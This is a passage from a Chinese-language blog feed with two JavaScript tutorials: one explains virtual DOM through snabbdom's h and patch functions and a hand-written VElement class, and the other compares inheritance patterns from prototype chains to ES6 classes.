alt="snabbdom"></p><p>h函数和pathch函数就是snabbdom的核心API，也就是vdom的核心API。</p><p>h函数就是定义一个虚拟DOM节点。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">var vnode = h(<span class="hljs-string">'ul#list'</span>, &#123;&#125;, [<br>    h(<span class="hljs-string">'li.item'</span>, &#123;&#125;, <span class="hljs-string">'Item1'</span>),<br>    h(<span class="hljs-string">'li.item'</span>, &#123;&#125;, <span class="hljs-string">'Item2'</span>)<br>])<br> <br> <br>//对应的内容：<br>&#123;<br>    tag: <span class="hljs-string">'ul'</span>,<br>    attrs: &#123;<br>        id: <span class="hljs-string">'list'</span><br>    &#125;,<br>    children: [<br>        &#123;<br>            tag: <span class="hljs-string">'li'</span>,<br>            attrs: &#123;className: <span class="hljs-string">'item'</span>&#125;,<br>            children: [<span class="hljs-string">'Item 1'</span>]<br>        &#125;,&#123;<br>            tag: <span class="hljs-string">'li'</span>,<br>            attrs: &#123;className: <span class="hljs-string">'item'</span>&#125;,<br>            children: [<span class="hljs-string">'Item 2'</span>]<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure></p><p>patch函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">patch(container, vnode) //第一次渲染，container是一个真实的DOM节点，vnode是虚拟的DOM，将vnode放入到container中。<br>patch(vnode, newVnode)  //DOM有所改变时，将新的newVnode渲染到vnode中，这个过程中将进行复杂的对比，只修改不同的地方<br></code></pre></td></tr></table></figure></p><p>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">"en"</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">"UTF-8"</span>&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;div id=<span class="hljs-string">"container"</span>&gt;&lt;/div&gt;<br>&lt;button id=<span class="hljs-string">"btn-change"</span>&gt;change&lt;/button&gt;<br>&lt;script src=<span class="hljs-string">"https://cdn.bootcss.com/snabbdom/0.7.1/snabbdom.js"</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">"https://cdn.bootcss.com/snabbdom/0.7.1/snabbdom-class.js"</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">"https://cdn.bootcss.com/snabbdom/0.7.1/snabbdom-props.js"</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">"https://cdn.bootcss.com/snabbdom/0.7.1/snabbdom-style.js"</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">"https://cdn.bootcss.com/snabbdom/0.7.1/snabbdom-eventlisteners.js"</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">"https://cdn.bootcss.com/snabbdom/0.7.1/h.js"</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br>    var snabbdom = window.snabbdom<br>    var patch = snabbdom.init([<br>            snabbdom_class,<br>            snabbdom_props,<br>            snabbdom_style,<br>            snabbdom_eventlisteners<br>        ])<br>    var h = snabbdom.h<br>    var data = [<br>            &#123;<br>                name: <span class="hljs-string">'张三'</span>,<br>                age: <span class="hljs-string">'20'</span>,<br>                address: <span class="hljs-string">'北京'</span><br>            &#125;,<br>            &#123;<br>                name: <span class="hljs-string">'李四'</span>,<br>                age: <span class="hljs-string">'21'</span>,<br>                address: <span class="hljs-string">'上海'</span><br>            &#125;,<br>            &#123;<br>                name: <span class="hljs-string">'王五'</span>,<br>                age: <span class="hljs-string">'22'</span>,<br>                address: <span class="hljs-string">'广州'</span><br>            &#125;<br>        ]<br>        //把表头也放在data中<br>         data.unshift(&#123;<br>             name:<span class="hljs-string">'姓名'</span>,<br>             age: <span class="hljs-string">'年龄'</span>,<br>             address: <span class="hljs-string">'地址'</span><br>         &#125;)<br>         var container = document.getElementById(<span class="hljs-string">'container'</span>)<br>         //渲染函数<br>         var vnode<br>         <span class="hljs-keyword">function</span> render(data)&#123;<br>            var newVnode = h(<span class="hljs-string">'table'</span>,&#123;&#125;, data.map(<span class="hljs-keyword">function</span>(item)&#123;<br>                var tds = []<br>                var i<br>                <span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> item)&#123;<br>                    <span class="hljs-keyword">if</span>(item.hasOwnProperty(i))&#123;<br>                        tds.push(h(<span class="hljs-string">'td'</span>, &#123;&#125;, item[i] + <span class="hljs-string">''</span>))<br>                    &#125;<br>                &#125;<br>                <span class="hljs-built_in">return</span> h(<span class="hljs-string">'tr'</span>,&#123;&#125;,tds)<br>            &#125;))<br>             <span class="hljs-keyword">if</span>(vnode) &#123;<br>                patch(vnode, newVnode)<br>             &#125; <span class="hljs-keyword">else</span> &#123;<br>                patch(container, newVnode)<br>             &#125;<br>             vnode = newVnode<br>         &#125;<br>         render(data)<br> <br>         var btnChange = document.getElementById(<span class="hljs-string">'btn-change'</span>)<br>         btnChange.addEventListener(<span class="hljs-string">'click'</span>, <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>             data[1].age = 30<br>             data[2].address = <span class="hljs-string">'深圳'</span><br>             render(data)<br>         &#125;)<br> &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure></p><h3 id="原生js表示"><a href="#原生js表示" class="headerlink" title="原生js表示"></a>原生js表示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">//虚拟dom，参数分别为标签名、属性对象、子DOM列表<br>var VElement = <span class="hljs-keyword">function</span>(tagName, props, children) &#123;<br>    //保证只能通过如下方式调用：new VElement<br>    <span class="hljs-keyword">if</span> (!(this instanceof VElement)) &#123;<br>        <span class="hljs-built_in">return</span> new VElement(tagName, props, children);<br>    &#125;<br> <br>    //可以通过只传递tagName和children参数<br>    <span class="hljs-keyword">if</span> (util.isArray(props)) &#123;<br>        children = props;<br>        props = &#123;&#125;;<br>    &#125;<br> <br>    //设置虚拟dom的相关属性<br>    this.tagName = tagName;<br>    this.props = props || &#123;&#125;;<br>    this.children = children || [];<br>    this.key = props ? props.key : void 666;<br>    var count = 0;<br>    util.each(this.children, <span class="hljs-keyword">function</span>(child, i) &#123;<br>        <span class="hljs-keyword">if</span> (child instanceof VElement) &#123;<br>            count += child.count;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            children[i] = <span class="hljs-string">''</span> + child;<br>        &#125;<br>        count++;<br>    &#125;);<br>    this.count = count;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过VElement，我们可以很简单地用javascript表示DOM结构。比如<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">var vdom = velement(<span class="hljs-string">'div'</span>, &#123; <span class="hljs-string">'id'</span>: <span class="hljs-string">'container'</span> &#125;, [<br>    velement(<span class="hljs-string">'h1'</span>, &#123; style: <span class="hljs-string">'color:red'</span> &#125;, [<span class="hljs-string">'simple virtual dom'</span>]),<br>    velement(<span class="hljs-string">'p'</span>, [<span class="hljs-string">'hello world'</span>]),<br>    velement(<span class="hljs-string">'ul'</span>, [velement(<span class="hljs-string">'li'</span>, [<span class="hljs-string">'item #1'</span>]), velement(<span class="hljs-string">'li'</span>, [<span class="hljs-string">'item #2'</span>])]),<br>]);<br></code></pre></td></tr></table></figure></p><p>上面的javascript代码可以表示如下DOM结构：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;div id=<span class="hljs-string">"container"</span>&gt;<br>    &lt;h1 style=<span class="hljs-string">"color:red"</span>&gt;simple virtual dom&lt;/h1&gt;<br>    &lt;p&gt;hello world&lt;/p&gt;<br>    &lt;ul&gt;<br>        &lt;li&gt;item <span class="hljs-comment">#1&lt;/li&gt;</span><br>        &lt;li&gt;item <span class="hljs-comment">#2&lt;/li&gt;</span><br>    &lt;/ul&gt;   <br>&lt;/div&gt;<br></code></pre></td></tr></table></figure></p><p>同样我们可以很方便地根据虚拟DOM树构建出真实的DOM树。具体思路：根据虚拟DOM节点的属性和子节点递归地构建出真实的DOM树。见如下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">VElement.prototype.render = <span class="hljs-function"><span class="hljs-title">function</span></span>() &#123;<br>    //创建标签<br>    var el = document.createElement(this.tagName);<br>    //设置标签的属性<br>    var props = this.props;<br>    <span class="hljs-keyword">for</span> (var propName <span class="hljs-keyword">in</span> props) &#123;<br>        var propValue = props[propName]<br>        util.setAttr(el, propName, propValue);<br>    &#125;<br> <br>    //依次创建子节点的标签<br>    util.each(this.children, <span class="hljs-keyword">function</span>(child) &#123;<br>        //如果子节点仍然为velement，则递归的创建子节点，否则直接创建文本类型节点<br>        var childEl = (child instanceof VElement) ? child.render() : document.createTextNode(child);<br>        el.appendChild(childEl);<br>    &#125;);<br> <br>    <span class="hljs-built_in">return</span> el;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>对一个虚拟的DOM对象VElement，调用其原型的render方法，就可以产生一颗真实的DOM树。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vdom.render();<br></code></pre></td></tr></table></figure></p><hr><p>本文来自 zhanghuali2019 的CSDN 博客 ，全文地址请点击：<a href="https://blog.csdn.net/zhanghuali0210/article/details/82261798?utm_source=copy" target="_blank" rel="noopener">https://blog.csdn.net/zhanghuali0210/article/details/82261798?utm_source=copy</a> </p>]]></content>
      
      
      <categories>
          
          <category> VUE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VUE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js继承方法总结</title>
      <link href="/2018/09/07/js%E7%BB%A7%E6%89%BF%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2018/09/07/js%E7%BB%A7%E6%89%BF%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h2><p>首先介绍一下原型链的基本概念。<br>先来理解一下原型、构造函数和实例的关系。</p><ul><li>每个构造函数都有一个原型对象（通过prototype属性）</li><li>原型对象都包含一个指向构造函数的指针（通过constructor属性）</li><li>实例都包含一个指向原型对象的内部指针（通过隐式proto属性）</li></ul><p>那么，若原型对象等于另一个原型的实例，则此时原型对象将包含一个指向另一个原型对象的指针。相应的另一个原型中也包含一个指向另一个构造函数的指针。如此层层递进，就构成了实例与原型的链条。<br>这个概念可能不好理解，下面看来自高级程序上的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">SuperType</span></span>()&#123;<br>   this.property = <span class="hljs-literal">true</span>;<br>&#125;<br>SuperType.prototype.getSuperValue = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>   <span class="hljs-built_in">return</span> this.property;  <br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">SubType</span></span>()&#123;<br>   this.subproperty = <span class="hljs-literal">false</span>;<br>&#125;<br>SubType.prototype = new SuperType(); // 继承的关键<br>SubType.prototype.getSubValue = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>   <span class="hljs-built_in">return</span> this.subproperty;<br>&#125;<br>var instance = new SubType();<br>alert(instance.getSuperValue()); // <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>例子中通过令SubType的原型对象等于SuperType的实例，将SubType与SuperType关联起来。使得SubType的实例可以访问SuperType的属性。</p><p>确定原型和实例的关系有两种方法：（它们都是通过原型链层层查找来确定）</p><ul><li>instanceof</li><li><p>isPrototypeOf()<br>使用原型链继承的方法有两个缺点：</p></li><li><p>由于包含引用类型值的原型属性会被所有实例共享，这样容易导致修改一个实例的引用值另一个也会被修改。<br>先看一个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">SuperType</span></span>() &#123;<br>    this.colors = [<span class="hljs-string">"red"</span>,<span class="hljs-string">"blue"</span>,<span class="hljs-string">"green"</span>];<br>    this.name = <span class="hljs-string">"super"</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">SubType</span></span>() &#123;<br><br>&#125;<br>SubType.prototype = new SuperType();<br><br>var instance1 = new SubType();<br>instance1.colors.push(<span class="hljs-string">"black"</span>);<br>instance1.name = <span class="hljs-string">"sub"</span>;<br>console.log(instance1.name); // sub<br>console.log(instance1.colors); //red, blue, green, black<br><br>var instance2 = new SubType();<br>console.log(instance2.name); // super<br>console.log(instance2.colors); //red, blue, green, black<br></code></pre></td></tr></table></figure></li></ul><p>就像上面的例子所示，当我们new一个新对象时（其过程可查看new一个新对象会发生什么），原型属性会复制一份到我们实例中。对于值类型，实例会复制其名字和值放在另一块内存中；而对于引用类型，实例只是复制了指向它的值的指针。因而修改实例的值类型，不会影响其他实例；但是修改引用类型的值，其他实例也会被影响到。</p><ul><li>创建子类型的实例时，并不能在不影响所有对象实例的情况下给超类型的构造函数传递参数。</li></ul><h2 id="构造函数继承"><a href="#构造函数继承" class="headerlink" title="构造函数继承"></a>构造函数继承</h2><p>也叫伪造对象或经典继承<br>基本思想：在子类型构造函数内部调用超类型构造函数。<br>还是先看例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> SuperType(name) &#123;<br>    this.colors = [<span class="hljs-string">'red'</span>, <span class="hljs-string">'black'</span>, <span class="hljs-string">'blue'</span>];<br>    this.name = name;<br>&#125;<br><span class="hljs-keyword">function</span> SubType(name) &#123;<br>    SuperType.call(this, name);<br>&#125;<br>SuperType.prototype.getName = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    console.log(this.name);<br>&#125;;<br><br>var instance1 = new SubType(<span class="hljs-string">'instance1'</span>);<br>instance1.colors.push(<span class="hljs-string">'green'</span>);<br>var instance2 = new SubType(<span class="hljs-string">'instance2'</span>);<br>console.log(instance1.colors); // red,black,blue,green<br>console.log(instance2.colors); // red,black,blue<br>console.log(instance1.name); // instance1<br>console.log(instance2.name); // instance2<br>instance1.getName(); // error<br>instance2.getName(); // error<br></code></pre></td></tr></table></figure></p><p>可以看出，使用构造函数继承的方式解决了原型链继承的问题。</p><ul><li>实例可以独享一份引用类型的值 </li><li>通过call改变this指向，这样每次执行SuperType函数，this指向的都是新的对象。相当于每个新的对象都有一份完整的SuperType代码。即每个实例都有一份自己的colors属性副本。</li><li>可以传参数<br>我们可以通过call函数向SuperType传参数</li></ul><p>构造函数继承也有缺点：</p><ul><li>无法实现函数复用<br>看上面的代码可知，我们只是执行了SuperType函数，但是并没有继承它的原型链上的函数。这样会导致若要使用公有函数时，自己定义或者在SuperType构造函数中定义，违背了函数复用的初衷。</li></ul><h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><p>也叫伪经典继承，它是最常用的的继承方式。<br>组合继承将原型链继承和构造函数继承结合到一起。<br>基本思想是：使用原型链实现对原型属性和方法的继承，借用构造函数实现对实例属性的继承。<br>看例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> SuperType(name)&#123;<br>    this.name = name;<br>    this.colors = [<span class="hljs-string">'red'</span>,<span class="hljs-string">'blue'</span>,<span class="hljs-string">'green'</span>];<br>&#125;<br>SuperType.prototype.sayName = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    console.log(this.name);<br>&#125;;<br><span class="hljs-keyword">function</span> SubType(name, age) &#123;<br>    SuperType.call(this,name); // 继承属性，第二次调用<br>    this.age = age;<br>&#125;<br>SubType.prototype = new SuperType(); // 继承方法，第一次调用<br>SubType.prototype.constructor = SubType;<br>SubType.prototype.sayAge = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    console.log(this.age);<br>&#125;;<br><br>var instance1 = new SubType(<span class="hljs-string">"instance1"</span>, 29);<br>instance1.colors.push(<span class="hljs-string">'black'</span>);<br>console.log(instance1.colors); // red,blue,green,black<br>instance1.sayName(); //instance1<br>instance1.sayAge(); // 29<br><br>var instance2 = new SubType(<span class="hljs-string">"instance2"</span>, 27);<br>console.log(instance2.colors); // red,blue,green<br>instance2.sayName(); // instance2<br>instance2.sayAge(); // 27<br></code></pre></td></tr></table></figure></p><p>由例子可知，组合继承结合了原型链继承和构造函数继承的优点，既可以拥有属于自己的属性，也有了共同的方法。<br>当然，它也有缺点。</p><ul><li>无论什么情况下，都会调用两次超类型构造函数。一次在创建子类型的原型时；一次在子类型构造函数内部。当第二次调用时，会重写第一次调用时获得的原型属性。</li></ul><h2 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h2><p>基本思想：借助原型可以基于已有的对象创建新对象，不必因此创建自定义类型。<br>看例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">var person = &#123;<br>  name: <span class="hljs-string">'Nicholas'</span>,<br>  friends: [<span class="hljs-string">"Shelby"</span>,<span class="hljs-string">"Court"</span>,<span class="hljs-string">"Van"</span>]<br>&#125;;<br>var anotherPerson = Object.create(person);<br>anotherPerson.name = <span class="hljs-string">"Greg"</span>;<br>anotherPerson.friends.push(<span class="hljs-string">"Rob"</span>);<br><br>var yetAnotherPerson = Object.create(person);<br>yetAnotherPerson.name = <span class="hljs-string">"Linda"</span>;<br>yetAnotherPerson.friends.push(<span class="hljs-string">"Barbie"</span>);<br><br>console.log(person.friends); // Shelby,Court,Van,Rob,Barbie<br>console.log(anotherPerson.friends);<br>// Shelby,Court,Van,Rob,Barbie<br>console.log(yetAnotherPerson.friends); <br>// Shelby,Court,Van,Rob,Barbie<br></code></pre></td></tr></table></figure></p><p>可以看出该方法与原型链继承类似，但是写法比它简单。<br>因此，若只是想让一个对象和另一个相似，可以使用这种方法。<br>不过它也存在缺点：</p><ul><li>包含引用类型值的属性始终共享相应的值。</li></ul><h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><p>基本思想：创建一个仅用于封装继承过程的函数，在内部对对象做相关操作，然后返回。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">var person = &#123;<br>  name: <span class="hljs-string">'Nicholas'</span>,<br>  friends: [<span class="hljs-string">"Shelby"</span>,<span class="hljs-string">"Court"</span>,<span class="hljs-string">"Van"</span>]<br>&#125;;<br><span class="hljs-keyword">function</span> createAnother(original) &#123;<br>    var <span class="hljs-built_in">clone</span> = Object.create(original);<br>    clone.sayHi = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>        console.log(<span class="hljs-string">"Hi"</span>);<br>    &#125;;<br>    <span class="hljs-built_in">return</span> <span class="hljs-built_in">clone</span>;<br>&#125;<br><br>var anotherPerson = createAnother(person);<br>anotherPerson.sayHi(); // Hi<br></code></pre></td></tr></table></figure></p><p>这样做使anotherPerson对象不仅有了person的属性方法，还有了自己的方法。但是这样做相当于构造函数那样，并不是真正的函数复用。而且包含引用类型值的属性依然始终共享相应的值。</p><h2 id="寄生组合式继承"><a href="#寄生组合式继承" class="headerlink" title="寄生组合式继承"></a>寄生组合式继承</h2><p>这个方法属于比较完美的方法。先看代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> SuperType(name) &#123;<br>    this.name = name;<br>    this.colors = [<span class="hljs-string">"red"</span>,<span class="hljs-string">"blue"</span>,<span class="hljs-string">"green"</span>];<br>&#125;<br>SuperType.prototype.sayName = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    console.log(this.name);<br>&#125;;<br><span class="hljs-keyword">function</span> SubType(name, age) &#123;<br>    SuperType.call(this, name);<br>    this.age = age;<br>&#125;<br><span class="hljs-keyword">function</span> inheritPrototype(subType, superType) &#123;<br>    var prototype = Object.create(superType.prototype);<br>    prototype.constructor = subType;<br>    subType.prototype = prototype;<br>&#125;<br>inheritPrototype(SubType,SuperType);<br><br>SubType.prototype.sayAge = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    console.log(this.age);<br>&#125;;<br></code></pre></td></tr></table></figure></p><p>这个方法解决了组合继承调用两次超类型的缺点。<br>首先回顾一下组合继承的两次调用：</p><ul><li>创建子类型的原型对象时调用（new SuperType()）<br>这个过程会主要是new一个对象的过程，它会复制SuperType的属性和方法给子类型。</li><li><p>在子类型构造函数里调用<br>在构造函数里调用时，又会复制一遍超类型的属性，因而会影响性能。<br>对于寄生组合式继承方式：</p></li><li><p>先将超类型中的原型对象复制一份，再new对象作为子类型的原型对象。这样做，我们只是复制了超类型的原型对象，而对于超类型构造函数里的属性不会复制。因而减少了调用超类型的次数。</p></li><li>这样做仍然保持原型链不变</li></ul><h2 id="ES6z中class实现继承"><a href="#ES6z中class实现继承" class="headerlink" title="ES6z中class实现继承"></a>ES6z中class实现继承</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">class SuperType &#123;<br>    constructor(name)&#123;<br>        this.name = name;<br>        this.colors = [<span class="hljs-string">"red"</span>, <span class="hljs-string">"blue"</span>, <span class="hljs-string">"green"</span>];<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">sayName</span></span>()&#123;<br>        console.log(this.name);<br>    &#125;<br>&#125;<br><br>class SubType extends SuperType &#123;<br>    constructor(name,age)&#123;<br>        super(name);<br>        this.age = age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">sayAge</span></span>()&#123;<br>        console.log(this.age);<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">let</span> instance1 = new SubType(<span class="hljs-string">"instance1"</span>,25);<br>instance1.colors.push(<span class="hljs-string">'black'</span>);<br>console.log(instance1.colors); //red,blue,green,black<br>instance1.sayName(); // instance1<br><span class="hljs-built_in">let</span> instance2 = new SubType(<span class="hljs-string">"instance2"</span>,23);<br>console.log(instance2.colors); // red,blue,green<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
